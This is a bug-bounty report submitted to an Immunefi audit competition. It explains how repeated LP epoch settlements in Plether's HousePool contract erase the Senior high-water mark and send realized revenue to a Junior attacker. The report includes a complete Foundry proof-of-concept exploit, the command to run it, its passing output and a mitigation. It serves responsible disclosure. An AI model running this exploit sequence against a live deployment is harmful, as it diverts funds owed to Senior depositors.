# \#99088 [SC-High] Repeated partial recapitalization settlement erases the Senior high-water mark and redirects realized recovery revenue   to Junior LPs

**Submitted on Nov 11th 2026 at 20:09:21 UTC by @coinsspor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99088
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

When an owner-funded Pool recapitalization is only partially settleable because Pool cash also backs outstanding flat-trader claims, HousePool correctly preserves the full recapitalization amount as Senior's high-water-mark target during the first reconciliation. A later reconciliation, however, treats the shrinking residual pending bucket as a new full target. An ordinary Junior LP can trigger this second reconciliation through a valid, permissionless zero-NAV redemption/refund epoch. With no new loss, claim, cash movement, or owner action, the second pass reduces a 100 USDG Senior high-water mark to 50 USDG. After 50 USDG of trading revenue is subsequently realized, the vulnerable state routes it to Junior rather than restoring Senior, and the attacker can redeem a direct 25.000114 USDG payout. The no-attack control routes all 50 USDG to Senior and pays the attacker zero.

## Vulnerability Details

### Frozen revision and affected code

The issue is reproduced at the competition commit:

    a82d4fefb02768e5b3bddcc97dee371eee24fea8

Primary affected locations:

- packages/perps/src/HousePool.sol:1555-1599 — reconciliation calculates a settleable prefix, reserves it in the plan, commits the resulting waterfall state, and then applies the pending claimant buckets.
- packages/perps/src/HousePool.sol:1759-1775 — the current outstanding claimant bucket is passed as claimant intent and then decreased.
- packages/perps/src/HousePool.sol:1829-1834 — the pending bucket is capped to current distributable equity on every reconciliation.
- packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:40-55 — the current outstanding recapitalization bucket is passed as recapitalizationTargetAssets.
- packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:103-132 — when both stored principals are zero, applying a recapitalization overwrites seniorHighWaterMark with max(recapitalizationTargetAssets, amount).
- packages/perps/src/HousePool.sol:797-835 and 944-986, together with packages/perps/src/TrancheVault.sol:606-630 and 1611-1617 — an ordinary full-balance zero-NAV redemption is valid, its refund increments processedEpochs, and therefore it supplies real epoch progress rather than reverting with HousePool__NoLpEpochProgress.

The vulnerable bootstrap branch is:

    if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
        state.waterfall.seniorPrincipal += remaining;
        state.waterfall.seniorHighWaterMark =
            recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
        remaining = 0;
    }

The intended parameter meaning is documented as the full recapitalization intent. The implementation does not persist the original intent independently from its shrinking unsettled balance. On each pass, HousePool supplies the current pendingRecapitalizationAssets value as the target. Consequently, after the first partial settlement, the next reconciliation can overwrite the original high-water-mark anchor with the smaller residual bucket.

### Concrete state transition

Let:

- R = 100 USDG: one legitimate owner recapitalization;
- C = 50 USDG: an outstanding flat-trader claim;
- D = R - C = 50 USDG: current liability-adjusted distributable equity;
- P: pending recapitalization;
- S: stored Senior principal;
- H: Senior high-water mark.

Both tranche share supplies remain nonzero after a prior trading-loss wipe, while Senior and Junior principal are zero. The owner calls the documented CfdEngine.recapitalizePool(100 USDG) recovery path. Immediately before the first reconciliation:

| State | Pool cash | Trader claims | Distributable D | Pending P | Senior S |
|---|---:|---:|---:|---:|---:|
| After recapitalization | 100 | 50 | 50 | 100 | 0 |

#### First reconciliation: correct partial settlement

1. _settleablePendingClaimantBuckets returns min(P,D) = 50.
2. planReconcile reserves that 50, leaving no nonpending equity and zero stored principal.
3. applyClaimantRecapitalizationIntent(amount=50,target=100) executes the empty-principal bootstrap.
4. The result is S=50 and H=100.
5. HousePool decreases the pending bucket from P=100 to P=50.

This first result is correct:

| State | Cash | Claims | D | P | S | H |
|---|---:|---:|---:|---:|---:|---:|
| After first pass | 100 | 50 | 50 | 50 | 50 | 100 |

#### Permissionless second reconciliation: target erosion

The attacker owns ordinary, cooldown-complete Junior shares and requests redemption of its full balance. The full-balance request is allowed even though estimated redeem assets are below the minimum, because TrancheVault._requireMinimumRedeemSize reverts only when shares < maxShares.

All trader positions are flat. Therefore HousePool.settleLpEpoch(0,0) is permissionless: the Router-only branch at HousePool.sol:809-819 applies only when hasOpenPositions is true and the oracle is not frozen.

At zero Junior NAV, HousePool._fundRedemptionPhase calls refundRedeemEpochRemainder and increments processedEpochs. This is genuine LP epoch progress, so the final no-progress guard does not roll the transaction back.

During that same settlement, before the refund phase:

1. D is still 50 and P is still 50.
2. The next settleable recapitalization prefix is again 50.
3. planReconcile reserves the prefix and reprices nonpending equity to zero, temporarily producing S=0 while H remains 100.
4. The pending helper enters the empty-principal bootstrap branch again.
5. The full-target argument is no longer the original R=100. It is the residual current bucket P=50.
6. The assignment restores S=50 but overwrites H from 100 to 50.
7. The pending bucket is decreased from 50 to zero.

No cash, liability, oracle, owner intent, or trading state changed between the two reconciliation passes:

| State | Cash | Claims | D | P | S | H | Protected gap H-S |
|---|---:|---:|---:|---:|---:|---:|---:|
| Before attacker pass | 100 | 50 | 50 | 50 | 50 | 100 | 50 |
| After attacker pass | 100 | 50 | 50 | 0 | 50 | 50 | 0 |

The same physical 50 USDG of distributable equity has therefore been used twice to consume one 100 USDG pending recapitalization intent. The protected Senior recovery gap falls from 50 USDG to zero without an economic event capable of extinguishing it.

### Realized-revenue extraction

The flat trader claimant subsequently settles its 50 USDG claim. The Pool then has 50 USDG backing S=50. The PoC next records 50 USDG of genuine realized claimant revenue through the authenticated Engine/HousePool inflow boundary:

- Control state without the attacker retry: S=50 and H=100. The realized 50 USDG restores Senior to S=100; Junior receives zero and the attacker receives zero.
- Poisoned state after the retry: S=50 and H=50. There is no Senior recovery gap, so the realized 50 USDG is assigned to Junior.

The attacker then performs an ordinary funded Junior redemption and receives 25.000114 USDG. The remaining 24.999886 USDG stays as Junior principal. Together they equal the 50 USDG that the control assigns entirely to Senior.

### Production-path reachability

The PoC includes a separate end-to-end reachability test. It:

1. opens four balanced Long/Short pairs through the real CfdEngine;
2. closes the Long legs at a positive 0.25 basket price;
3. closes the Short legs after a market traversal at 1.75, with both prices below the configured 2.00 cap;
4. leaves every claimant account flat and creates aggregate real trader claims exceeding Pool assets;
5. reconciles the resulting ordinary cumulative trading loss, wiping both tranche principals;
6. clears degraded mode through the documented governance recovery procedure;
7. recapitalizes the Pool with exactly twice the claim shortfall; and
8. reproduces the same first-pass H=R followed by second-pass H=R/2 erosion using two public LP epoch transitions.

This reachability test does not burn Pool tokens, directly write claim storage, or mock any in-scope accounting transition.

### Required attacker capabilities

The attacker needs only:

1. ordinary, cooldown-complete Junior shares that survive a Pool wipe;
2. the normal recovery state in which one legitimate owner recapitalization is only partially distributable because outstanding flat-trader claims are reserved; and
3. permission to submit and settle ordinary asynchronous LP requests, which is public while positions are flat.

The attacker does not need owner, guardian, pauser, seed-receiver, oracle, keeper-service, Router, settlement-sidecar, or other privileged permissions. The owner follows the documented recapitalization path and supplies the declared amount.

### Why the transaction does not revert

- requestRedeem uses a nonzero full balance.
- The deposit cooldown is completed.
- shares == maxShares bypasses only the documented minimum-size restriction; it does not bypass authorization.
- msg.sender is the share owner.
- All positions are flat, so settleLpEpoch is permissionless.
- The zero-NAV redemption becomes a refundable epoch.
- refundRedeemEpochRemainder increments processedEpochs.
- The settlement therefore satisfies the no-progress guard.
- The harmful HWM overwrite is committed before the refund phase and survives the transaction.

### Why this is an incomplete fix rather than the publicly disclosed issue

The closest public item is SC Audit Studio SC-L1 / Plether PR #29. That item concerned pending claimant buckets being applied above liability-adjusted distributable value. PR #29 capped each pass and explicitly intended the full claimant intent, including the Senior recovery target, to survive partial settlement.

The published regression covers one partial pass followed by removal of the liability, after which the residual becomes fully distributable. It does not execute another reconciliation while the same liability and distributable amount remain unchanged.

This report demonstrates a different residual failure at the frozen commit: each individual pass respects the new cap, but the second pass supplies the already-decremented residual as the supposed full target and overwrites H from 100 to 50. The frozen implementation therefore passes the public first-pass regression while violating the cross-pass invariant that the fix was intended to preserve.

Cecuro MED-12 is also different. It concerns recapitalization and revenue in the same batch and routing revenue to unassignedAssets. This report requires no mixed same-batch inflow and produces a different harmful state: cross-batch erosion of Senior's high-water mark followed by an actual Junior redemption of subsequently realized revenue.

## Impact Details

The selected eligible impact is High — Theft of unclaimed yield.

Senior's high-water mark is the on-chain waterfall priority under which recovery revenue restores Senior before value accrues to Junior. The exploit deletes 50 USDG of this priority without an economic loss event. After the poisoned state exists, the PoC realizes 50 USDG of trading revenue:

- the canonical control assigns all 50 USDG to Senior;
- the vulnerable state assigns all 50 USDG to Junior;
- the ordinary Junior attacker immediately redeems 25.000114 USDG;
- 24.999886 USDG remains as Junior principal;
- the same attacker receives zero in the control.

Concrete values:

| Quantity | Value |
|---|---:|
| Owner recapitalization | 100.000000 USDG |
| Outstanding flat-trader claim | 50.000000 USDG |
| Liability-adjusted distributable equity | 50.000000 USDG |
| HWM after first legitimate pass | 100.000000 USDG |
| HWM after attacker-triggered second pass | 50.000000 USDG |
| Senior recovery priority erased | 50.000000 USDG |
| Subsequently realized revenue redirected to Junior | 50.000000 USDG |
| Attacker direct redemption | 25.000114 USDG |
| Residual Junior principal | 24.999886 USDG |
| Attacker redemption in control | 0 USDG |
| Cash/liability change during harmful second pass | 0 USDG |

For R=2D, the two passes reduce the recovery target from R to D and redirect D of subsequently realized revenue. The dollar impact scales with the recapitalization size.

This report does not claim Critical principal theft or protocol insolvency. It claims High theft of unclaimed yield because the PoC first realizes the revenue, then demonstrates that the corrupted HWM routes it to Junior and permits an actual token redemption.

Pausing future epoch settlement could stop additional calls only if monitoring detects the condition before exploitation. It does not restore the overwritten HWM, and after Junior redeems the misallocated value, a later pause or additional owner funding cannot claw it back.

## Suggested Mitigation

Persist the original target of each recapitalization intent independently from its shrinking unsettled amount. Every residual settlement pass belonging to the same intent must receive the original target, not current pendingRecapitalizationAssets. Clear the anchor only after that intent is fully consumed. If another owner recapitalization arrives while one is pending, define explicit aggregation rules without discarding the existing recovery target.

Add a regression test with this sequence:

1. R=100, outstanding claims=50, distributable=50.
2. First reconciliation produces S=50, H=100, P=50.
3. A second real-progress reconciliation occurs without changing cash or claims.
4. The required postcondition preserves the unconsumed 50 USDG recovery gap; it must not produce H=50 and P=0.
5. After the claims settle and 50 USDG of revenue is realized, Senior must become 100 and Junior must receive zero.

## References

- Frozen HousePool.sol: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- Frozen HousePoolPendingPreviewLib.sol: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol
- Frozen TrancheVault.sol: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- Public Plether PR #29: https://github.com/Plether-Fi/plether-core/pull/29
- Plether competition scope: https://immunefi.com/audit-competition/plether/scope/


## Proof of Concept

## Proof of Concept

### What this PoC proves

This Foundry PoC runs against the frozen competition source at commit:

    a82d4fefb02768e5b3bddcc97dee371eee24fea8

It contains three tests:

1. Exploit: two permissionless, real-progress LP epoch settlements reduce the Senior high-water mark from 100 USDG to 50 USDG without any intervening economic change. After 50 USDG of trading revenue is realized, Junior receives the value and the attacker redeems 25.000114 USDG.
2. Negative control: without the harmful repeated reconciliation, the same 50 USDG of realized revenue restores Senior from 50 USDG to 100 USDG; Junior receives zero and the attacker receives zero.
3. Production-path reachability: real CfdEngine opens and closes create flat trader claims and wipe both tranche principals; documented recapitalization followed by two public LP epoch transitions reproduces the same target erosion. This test does not burn Pool tokens or directly write claim storage.

The PoC does not modify any contract under packages/perps/src and uses no mainnet, testnet, fork, RPC, API key, or external oracle service.

### Step-by-step exploit sequence

1. Senior and Junior share supplies are nonzero, but prior trading loss has reduced both stored principals to zero.
2. An outstanding flat-trader claim of 50 USDG exists.
3. The owner legitimately calls CfdEngine.recapitalizePool(100 USDG).
4. Pool cash is 100 USDG, claims are 50 USDG, and liability-adjusted distributable equity is therefore 50 USDG.
5. The first LP epoch settlement applies only 50 USDG of the pending recapitalization:
   - pending recapitalization P: 100 -> 50;
   - Senior principal S: 0 -> 50;
   - Senior HWM H: preserved at 100.
6. The ordinary Junior attacker submits a full-balance redemption after cooldown.
7. Because all positions are flat, the attacker permissionlessly calls HousePool.settleLpEpoch(0,0).
8. The second reconciliation occurs with cash, claims, and distributable equity unchanged:
   - the remaining pending prefix 50 is reserved;
   - the plan temporarily reprices Senior principal from 50 to zero;
   - the empty-principal bootstrap executes again;
   - the current residual P=50 is incorrectly supplied as the full recapitalization target;
   - S returns to 50, H is overwritten 100 -> 50, and P becomes zero.
9. The zero-NAV redemption is refunded and increments processedEpochs, so HousePool's no-progress guard does not revert the transaction.
10. The trader settles the 50 USDG claim.
11. The PoC realizes 50 USDG of trading revenue through the authenticated claimant-inflow boundary.
12. Because the corrupted state has S=H=50, all realized revenue is assigned to Junior. In the control, H remains 100 and all 50 USDG restores Senior.
13. The attacker performs an ordinary funded Junior redemption and receives 25.000114 USDG; the control attacker receives zero.

### Broken invariant

For one pending recapitalization intent, repeated reconciliation without new assets, liabilities, trading loss, or owner intent must not decrease the already-established Senior recovery target.

    Unchanged economic state:
      Pool cash = 100 USDG
      Trader claims = 50 USDG
      Distributable equity = 50 USDG

    Before attacker-triggered pass:
      Pending recapitalization P = 50
      Senior principal S = 50
      Senior HWM H = 100
      Protected recovery gap H-S = 50

    After attacker-triggered pass:
      Pending recapitalization P = 0
      Senior principal S = 50
      Senior HWM H = 50
      Protected recovery gap H-S = 0

### Installation

Save the following complete source as:

    packages/perps/test/perps/research/PendingRecapitalizationHwmErosionResearch.t.sol

### Complete runnable Foundry source

    // SPDX-License-Identifier: AGPL-3.0
    pragma solidity 0.8.35;

    import {BasePerpTest} from "../BasePerpTest.sol";
    import {CfdTypes} from "@plether/perps/CfdTypes.sol";
    import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

    /// @notice Research regression for repeated partial settlement of a claimant recapitalization bucket.
    /// @dev The claimant inflows are installed through the real Engine/HousePool authorization boundary. The test
    ///      isolates the vulnerable HousePool state transition; it does not replace any in-scope accounting logic.
    contract PendingRecapitalizationHwmErosionResearchTest is BasePerpTest {

        address internal constant SENIOR_VICTIM = address(0x5100);
        address internal constant JUNIOR_SEED_HOLDER = address(0x5EED);
        address internal constant JUNIOR_ATTACKER = address(0xBADD);
        address internal constant TRADER_CLAIMANT = address(0xC1A1);

        uint256 internal constant SEED_ASSETS = 100e6;
        uint256 internal constant CLAIM_ASSETS = 50e6;
        uint256 internal constant RECAP_ASSETS = 100e6;
        uint256 internal constant INITIAL_DISTRIBUTABLE = RECAP_ASSETS - CLAIM_ASSETS;
        uint256 internal constant ATTACKER_JUNIOR_DEPOSIT = 100e6;

        function _initialJuniorDeposit() internal pure override returns (uint256) {
            return 0;
        }

        function _initialSeniorDeposit() internal pure override returns (uint256) {
            return 0;
        }

        function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
            return SEED_ASSETS;
        }

        function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
            return SEED_ASSETS;
        }

        function _juniorSeedReceiver() internal pure override returns (address) {
            return JUNIOR_SEED_HOLDER;
        }

        function _seniorSeedReceiver() internal pure override returns (address) {
            return SENIOR_VICTIM;
        }

        function _preparePartialRecapitalization() internal {
            // Give the attacker ordinary (non-seed-floor) Junior shares. After the wipe, a full-balance zero-NAV redeem
            // remains admissible and provides the real epoch progress required by HousePool.
            _fundJunior(JUNIOR_ATTACKER, ATTACKER_JUNIOR_DEPOSIT);

            // A prior LP loss wipes both principals while Senior's recovery entitlement survives.
            settlementToken.burn(address(pool), settlementToken.balanceOf(address(pool)));
            vm.prank(address(juniorVault));
            pool.reconcile();
            assertEq(pool.seniorPrincipal(), 0, "setup: Senior principal must be wiped");
            assertEq(pool.juniorPrincipal(), 0, "setup: Junior principal must be wiped");
            assertGe(pool.seniorHighWaterMark(), SEED_ASSETS, "setup: Senior HWM must survive the loss");

            // Model an authenticated, already-existing flat trader claim. This invokes the production Engine claim hook,
            // including its access control and aggregate-liability mutation; only the external settlement-sidecar caller
            // is impersonated as a fixture.
            vm.prank(address(engine.settlementSidecar()));
            engine.settlementRecordTraderClaim(TRADER_CLAIMANT, CLAIM_ASSETS, false);
            assertEq(engine.traderClaimBalanceAssets(TRADER_CLAIMANT), CLAIM_ASSETS);

            // Governance performs the documented recovery action with exact token receipt.
            settlementToken.mint(address(this), RECAP_ASSETS);
            settlementToken.approve(address(engine), RECAP_ASSETS);
            engine.recapitalizePool(RECAP_ASSETS);
            assertEq(pool.pendingRecapitalizationAssets(), RECAP_ASSETS);
            assertEq(pool.totalAssets(), RECAP_ASSETS);
        }

        function _queueAndSettleAttackerRedeem() internal returns (uint256 requestId) {
            uint256 cooldownEnd = juniorVault.lastDepositTime(JUNIOR_ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
            if (block.timestamp < cooldownEnd) {
                vm.warp(cooldownEnd);
            }
            uint256 shares = juniorVault.maxRequestRedeem(JUNIOR_ATTACKER);
            assertGt(shares, 0, "attacker needs one ordinary full-balance redeem for real epoch progress");
            vm.prank(JUNIOR_ATTACKER);
            requestId = juniorVault.requestRedeem(shares, JUNIOR_ATTACKER, JUNIOR_ATTACKER);
            uint256 maturity = juniorVault.depositEpochStart(requestId);
            if (block.timestamp < maturity) {
                vm.warp(maturity);
            }
            vm.prank(JUNIOR_ATTACKER);
            pool.settleLpEpoch(0, 0);
        }

        function _claimZeroValueRefund(
            uint256 requestId
        ) internal {
            assertTrue(juniorVault.redeemRefundPending(requestId, JUNIOR_ATTACKER));
            vm.prank(JUNIOR_ATTACKER);
            juniorVault.claimRedeemRefund(requestId, JUNIOR_ATTACKER, JUNIOR_ATTACKER);
        }

        function _recordRealizedTradingRevenue(
            uint256 amount
        ) internal {
            // Equivalent to cash collected by a settlement path before its authenticated ownership-routing callback.
            settlementToken.mint(address(pool), amount);
            vm.prank(address(engine.settlementSidecar()));
            pool.recordClaimantInflow(
                amount, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
            );
        }

        function test_Research_PermissionlessRepeatedReconcileErasesSeniorRecoveryAndRoutesRevenueToJunior() public {
            _preparePartialRecapitalization();

            // First permissionless settlement can allocate only the 50 USDG terminal equity not reserved by the trader
            // claim. It correctly remembers the full 100 USDG recapitalization intent in the Senior HWM.
            uint256 requestId = _queueAndSettleAttackerRedeem();
            _claimZeroValueRefund(requestId);
            assertEq(pool.seniorPrincipal(), INITIAL_DISTRIBUTABLE);
            assertEq(pool.seniorHighWaterMark(), RECAP_ASSETS);
            assertEq(pool.pendingRecapitalizationAssets(), CLAIM_ASSETS);

            // No cash, liability, oracle, or position changes occur. One retry reserves the remaining 50 USDG pending
            // prefix, wipes the previously allocated 50 USDG principal, and bootstraps that same cash again while
            // overwriting HWM with the shrinking residual intent. Two total passes erase 50 USDG of Senior recovery.
            for (uint256 i = 0; i < 1; ++i) {
                requestId = _queueAndSettleAttackerRedeem();
                _claimZeroValueRefund(requestId);
            }
            assertEq(pool.pendingRecapitalizationAssets(), 0, "all recap intent was consumed by retries");
            assertEq(pool.seniorPrincipal(), INITIAL_DISTRIBUTABLE, "the same 50 USDG remains physically backed");
            assertEq(pool.seniorHighWaterMark(), INITIAL_DISTRIBUTABLE, "50 USDG Senior recovery was erased");

            // The claimant takes the senior trader claim. The remaining 50 USDG still backs Senior principal exactly.
            vm.prank(TRADER_CLAIMANT);
            engine.settleTraderClaim(TRADER_CLAIMANT);
            assertEq(pool.totalAssets(), INITIAL_DISTRIBUTABLE);
            assertEq(engine.traderClaimBalanceAssets(TRADER_CLAIMANT), 0);

            // A later 50 USDG of realized claimant revenue should restore Senior to its 100 USDG HWM. Because the retry
            // destroyed that HWM, reconciliation sends the amount to Junior. The same ordinary redeem that supplies real
            // epoch progress is then funded, turning part of the misallocated recovery priority into a direct payout.
            _recordRealizedTradingRevenue(CLAIM_ASSETS);
            uint256 attackerCashBefore = settlementToken.balanceOf(JUNIOR_ATTACKER);
            requestId = _queueAndSettleAttackerRedeem();
            uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, JUNIOR_ATTACKER);
            assertGt(claimableShares, 0, "poisoned Junior principal must fund the attacker's redeem");
            vm.prank(JUNIOR_ATTACKER);
            juniorVault.claimRedeem(requestId, claimableShares, JUNIOR_ATTACKER, JUNIOR_ATTACKER);
            uint256 attackerCashGain = settlementToken.balanceOf(JUNIOR_ATTACKER) - attackerCashBefore;

            assertEq(pool.seniorPrincipal(), INITIAL_DISTRIBUTABLE, "Senior receives none of the recovery revenue");
            assertGt(attackerCashGain, 0, "attacker directly withdraws displaced Senior recovery");
            assertEq(
                attackerCashGain + pool.juniorPrincipal(),
                CLAIM_ASSETS,
                "all 50 USDG is split between attacker payout and residual Junior ownership"
            );
        }

        function test_Control_WithoutRetriesRealizedRevenueCompletesSeniorRecapitalization() public {
            _preparePartialRecapitalization();

            uint256 requestId = _queueAndSettleAttackerRedeem();
            _claimZeroValueRefund(requestId);
            assertEq(pool.seniorPrincipal(), INITIAL_DISTRIBUTABLE);
            assertEq(pool.seniorHighWaterMark(), RECAP_ASSETS);
            assertEq(pool.pendingRecapitalizationAssets(), CLAIM_ASSETS);

            vm.prank(TRADER_CLAIMANT);
            engine.settleTraderClaim(TRADER_CLAIMANT);
            _recordRealizedTradingRevenue(CLAIM_ASSETS);

            uint256 attackerCashBefore = settlementToken.balanceOf(JUNIOR_ATTACKER);
            requestId = _queueAndSettleAttackerRedeem();
            _claimZeroValueRefund(requestId);

            assertEq(pool.pendingRecapitalizationAssets(), 0);
            assertEq(pool.seniorPrincipal(), RECAP_ASSETS, "the full recap belongs to Senior without retry poisoning");
            assertEq(pool.seniorHighWaterMark(), RECAP_ASSETS);
            assertEq(pool.juniorPrincipal(), 0, "Junior must not capture Senior recapitalization");
            assertEq(
                settlementToken.balanceOf(JUNIOR_ATTACKER), attackerCashBefore, "control redeem receives no Senior recovery"
            );
        }

        function test_Reachability_RealTradingWipesTranchesAndThenTwoPassesErodeTheRecapTarget() public {
            _fundJunior(JUNIOR_ATTACKER, 5000e6);

            // Four balanced pairs are admitted without exceeding the skew limit. Longs realize profit at a positive 0.25
            // basket price; after the market later traverses the range, Shorts realize profit at 1.75. Both values are
            // nonzero and below CAP_PRICE. This compresses ordinary cumulative trading loss across two market states;
            // it is not a token burn or direct claim fixture.
            for (uint256 i = 0; i < 4; ++i) {
                address longAccount = address(uint160(0xD100 + i));
                address shortAccount = address(uint160(0xD200 + i));
                _fundTrader(longAccount, 110e6);
                _fundTrader(shortAccount, 110e6);
                _open(longAccount, CfdTypes.Side.LONG, 1000e18, 100e6, 1e8);
                _open(shortAccount, CfdTypes.Side.SHORT, 1000e18, 100e6, 1e8);
            }
            for (uint256 i = 0; i < 4; ++i) {
                _close(address(uint160(0xD100 + i)), CfdTypes.Side.LONG, 1000e18, 25_000_000);
            }
            for (uint256 i = 0; i < 4; ++i) {
                _close(address(uint160(0xD200 + i)), CfdTypes.Side.SHORT, 1000e18, 175_000_000);
            }

            uint256 claims = engine.totalTraderClaimBalanceAssets();
            uint256 physicalAssets = pool.totalAssets();
            assertGt(claims, physicalAssets, "cumulative real trading gains must leave an underfunded flat claim book");
            for (uint256 i = 0; i < 4; ++i) {
                (uint256 longSize,,,,,,) = engine.positions(address(uint160(0xD100 + i)));
                (uint256 shortSize,,,,,,) = engine.positions(address(uint160(0xD200 + i)));
                assertEq(longSize + shortSize, 0, "every claimant account must be flat");
            }

            vm.prank(address(juniorVault));
            pool.reconcile();
            assertEq(pool.seniorPrincipal(), 0, "real cumulative trading loss must wipe Senior");
            assertEq(pool.juniorPrincipal(), 0, "real cumulative trading loss must wipe Junior");

            // Flat-account claims do not create residual max-profit liability. Governance performs the documented
            // containment recovery, then supplies exactly twice the claim shortfall. Algebraically this makes the new
            // distributable equity D equal half of the single recapitalization intent R.
            if (engine.degradedMode()) {
                engine.clearDegradedMode();
            }
            uint256 claimShortfall = claims - physicalAssets;
            uint256 recapitalization = 2 * claimShortfall;
            settlementToken.mint(address(this), recapitalization);
            settlementToken.approve(address(engine), recapitalization);
            engine.recapitalizePool(recapitalization);

            uint256 requestId = _queueAndSettleAttackerRedeem();
            _claimZeroValueRefund(requestId);
            assertEq(pool.seniorPrincipal(), claimShortfall, "first pass assigns one distributable prefix");
            assertEq(pool.seniorHighWaterMark(), recapitalization, "first pass preserves the one full recap target");
            assertEq(pool.pendingRecapitalizationAssets(), claimShortfall, "half of the recap intent remains pending");

            requestId = _queueAndSettleAttackerRedeem();
            _claimZeroValueRefund(requestId);
            assertEq(pool.seniorPrincipal(), claimShortfall, "the same physical equity is assigned again");
            assertEq(pool.seniorHighWaterMark(), claimShortfall, "second pass erases half of the recovery target");
            assertEq(pool.pendingRecapitalizationAssets(), 0, "the shrinking residual is falsely consumed");
        }

    }

### Exact execution command

Run from the frozen repository root:

    forge test \
      --root packages/perps \
      --offline \
      --use /root/.svm/0.8.35/solc-0.8.35 \
      --match-path test/perps/research/PendingRecapitalizationHwmErosionResearch.t.sol \
      -vv

Toolchain:

- Forge 1.5.1
- Solidity 0.8.35
- via-IR compilation from the frozen repository configuration
- no network connection required

### Successful output

The final rerun after the terminology and assertion-message cleanup produced:

    Solc 0.8.35 finished in 116.44s
    Compiler run successful with warnings

    Ran 3 tests for test/perps/research/PendingRecapitalizationHwmErosionResearch.t.sol:PendingRecapitalizationHwmErosionResearchTest
    [PASS] test_Control_WithoutRetriesRealizedRevenueCompletesSeniorRecapitalization() (gas: 2120583)
    [PASS] test_Reachability_RealTradingWipesTranchesAndThenTwoPassesErodeTheRecapTarget() (gas: 8037830)
    [PASS] test_Research_PermissionlessRepeatedReconcileErasesSeniorRecoveryAndRoutesRevenueToJunior() (gas: 2659985)
    Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 49.59ms (44.56ms CPU time)

    Ran 1 test suite in 52.03ms (49.59ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)

The exploit trace includes the final direct payout:

    MockSettlementToken::transfer(TrancheVault, 25000114)
    MockSettlementToken::transfer(0x...baDd, 25000114)
    emit RedeemAssetsClaimed(... assets: 25000114)

Because USDG uses six decimals, 25000114 atomic units equals 25.000114 USDG.

### Negative/control result

The control test omits the harmful repeated reconciliation while keeping the same:

- 100 USDG recapitalization;
- 50 USDG outstanding claim;
- 50 USDG initial distributable equity; and
- 50 USDG subsequently realized revenue.

It asserts:

    pendingRecapitalizationAssets = 0
    seniorPrincipal = 100 USDG
    seniorHighWaterMark = 100 USDG
    juniorPrincipal = 0
    attacker token gain = 0

The exploit test instead asserts:

    seniorPrincipal = 50 USDG
    seniorHighWaterMark = 50 USDG
    attacker payout + residual Junior principal = 50 USDG
    attacker direct payout > 0

This isolates the repeated reconciliation as the condition that changes the final beneficiary.

### Suggested fix

Do not use the shrinking pendingRecapitalizationAssets balance as the full recapitalization target on every pass.

Persist an independent anchor for the original owner recapitalization intent, for example:

    uint256 pendingRecapitalizationAssets;       // unsettled amount
    uint256 pendingRecapitalizationTargetAssets; // original/preserved Senior recovery target

When a new owner recapitalization is accepted:

1. increase pendingRecapitalizationAssets by the received amount;
2. establish or explicitly aggregate pendingRecapitalizationTargetAssets according to the intended multi-intent policy; and
3. pass the preserved target to applyClaimantRecapitalizationIntent on every partial settlement pass.

The conceptual call must use:

    applyClaimantRecapitalizationIntent(
        state,
        settleableBuckets.recapitalizationAssets,
        preservedOriginalRecapitalizationTarget
    );

It must not use:

    applyClaimantRecapitalizationIntent(
        state,
        settleableBuckets.recapitalizationAssets,
        currentResidualPendingRecapitalizationAssets
    );

Clear the preserved target only after the corresponding intent is completely consumed.

### Required regression test for the fix

The fix should include a regression with:

1. R=100, claim=50, distributable=50.
2. First reconcile: S=50, H=100, P=50.
3. A second real-progress reconcile with unchanged cash and claims.
4. Assert that the unconsumed 50 USDG Senior recovery gap survives; the state must not become S=50, H=50, P=0.
5. Settle the claim and realize 50 USDG revenue.
6. Assert Senior becomes 100, Junior remains zero, and the Junior attacker cannot redeem any of that recovery revenue.

